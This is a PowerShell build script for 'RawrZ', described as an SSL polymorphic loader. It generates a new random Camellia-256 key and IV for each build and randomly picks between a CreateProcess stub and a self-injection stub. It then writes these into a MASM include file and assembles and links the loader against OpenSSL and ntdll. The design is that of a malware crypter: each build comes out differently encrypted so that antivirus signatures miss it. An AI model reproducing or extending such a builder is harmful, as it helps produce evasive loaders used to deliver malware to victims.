# RawrZ polymorph_ssl_build.ps1 - MASM64 SSL Polymorphic Loader Builder
# Generates fresh Camellia key/IV and random stub choice, then builds with OpenSSL

Write-Host "RawrZ SSL Polymorphic Loader Builder" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan

# Generate fresh Camellia key (32 bytes)
$keyBytes = 1..32 | ForEach-Object { '{0:X2}' -f (Get-Random -Max 256) }
$keyHex = $keyBytes -join ''

# Generate fresh IV (16 bytes)  
$ivBytes = 1..16 | ForEach-Object { '{0:X2}' -f (Get-Random -Max 256) }
$ivHex = $ivBytes -join ''

# Random stub choice (0 = CreateProcess, 1 = self-injection)
$stubChoice = Get-Random -Max 2

Write-Host "Generated Camellia Key: $keyHex" -ForegroundColor Yellow
Write-Host "Generated Camellia IV:  $ivHex" -ForegroundColor Yellow
Write-Host "Stub Choice: $stubChoice (0=CreateProcess, 1=SelfInject)" -ForegroundColor Yellow

# Format key for MASM TEXTEQ
$keyFormatted = ($keyBytes -split '(.{2})' | Where-Object { $_ -ne '' }) -join 'h,'
$keyFormatted += 'h'

# Format IV for MASM TEXTEQ  
$ivFormatted = ($ivBytes -split '(.{2})' | Where-Object { $_ -ne '' }) -join 'h,'
$ivFormatted += 'h'

# Generate poly_ssl.inc
$incContent = @"
; poly_ssl.inc - Generated by pre-build step
; DO NOT EDIT - overwritten on every build
CAMELLIA_KEY  TEXTEQ <$keyFormatted>
CAMELLIA_IV   TEXTEQ <$ivFormatted>
STUB_CHOICE   EQU $stubChoice
"@

Set-Content "poly_ssl.inc" $incContent -Encoding ASCII
Write-Host "Generated poly_ssl.inc with fresh keys" -ForegroundColor Green

# Build the SSL polymorphic loader
Write-Host "Building SSL polymorphic loader..." -ForegroundColor Cyan
try {
    # Check if OpenSSL is available
    $opensslPath = Get-Command "openssl" -ErrorAction SilentlyContinue
    if (-not $opensslPath) {
        Write-Host "Warning: OpenSSL not found in PATH" -ForegroundColor Yellow
        Write-Host "Make sure OpenSSL 3.x static libs are installed" -ForegroundColor Yellow
    }

    # Assemble with ML64
    & ml64 /c polymorph_ssl.asm
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Assembly successful" -ForegroundColor Green
        
        # Link with OpenSSL
        & link /subsystem:console /entry:Start polymorph_ssl.obj libcrypto64.lib ws2_32.lib ntdll.lib
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Linking successful - polymorph_ssl.exe created" -ForegroundColor Green
            Write-Host "SSL Polymorphic loader ready with:" -ForegroundColor Magenta
            Write-Host "  - Fresh Camellia-256-CTR key/IV" -ForegroundColor Magenta
            Write-Host "  - Stub choice: $stubChoice" -ForegroundColor Magenta
            Write-Host "  - OpenSSL static linking" -ForegroundColor Magenta
        } else {
            Write-Host "Linking failed - check OpenSSL library paths" -ForegroundColor Red
            Write-Host "Try: vcpkg install openssl:x64-windows-static" -ForegroundColor Yellow
        }
    } else {
        Write-Host "Assembly failed" -ForegroundColor Red
    }
} catch {
    Write-Host "Build error: $_" -ForegroundColor Red
    Write-Host "Make sure Visual Studio 2022 with MASM and OpenSSL are installed" -ForegroundColor Yellow
}

Write-Host "Build complete!" -ForegroundColor Cyan
